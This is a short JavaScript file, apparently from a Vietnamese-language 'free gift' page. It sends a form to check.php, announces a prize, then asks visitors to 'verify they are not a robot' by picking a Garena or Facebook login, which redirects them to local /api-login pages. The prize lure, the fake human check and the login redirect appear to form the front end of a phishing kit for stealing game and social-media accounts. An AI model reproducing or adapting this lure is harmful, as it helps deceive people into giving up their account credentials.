    loginHandle = function() {
        $("#login-form").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "check.php",
                data: $(this).serialize(),
                dataType: "json",
                success: function (data) {
                    
                     if (data.status == 0) {
                         
Swal.fire({

  title: 'Thành công',
      imageUrl: 'assets/img/' + data.msg + '.png',
  imageWidth: 200,
  imageHeight: 200,
  imageAlt: 'Custom image',
  text: 'Nhận thành công phần quà '+ data.msg + ' Bạn cần xác thực không phải người máy ',
  showCancelButton: true,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Xác thực'
}).then((result) => {
  if (result.isConfirmed) {
  
Swal.fire({
  title: 'Chọn hình thức đăng nhập !',
  showDenyButton: true,
  showCancelButton: true,
  confirmButtonText: `Garena`,
  denyButtonText: `Facebook`,
}).then((result) => {

  if (result.isConfirmed) {
    location.href = '/api-login'
  } else if (result.isDenied) {
   location.href = '/api-loginf'
  }
})
  } else {
    swal('Bạn cần xác nhận không phải người máy mới có thể nhận quà');
    
  }
})

         
                     }else if(data.status == 2){
Swal.fire({
  icon: 'error',
  title: 'Oops...',
  text:  data.msg,
})       
                     }else{
                         
Swal.fire({
  icon: 'error',
  title: 'Oops...',
  text:  data.msg,
})               
                     }
                    
                 
                

                    
                }
            });
            b.preventDefault()
        })
    };
$(document).ready(function() {
    loginHandle();
});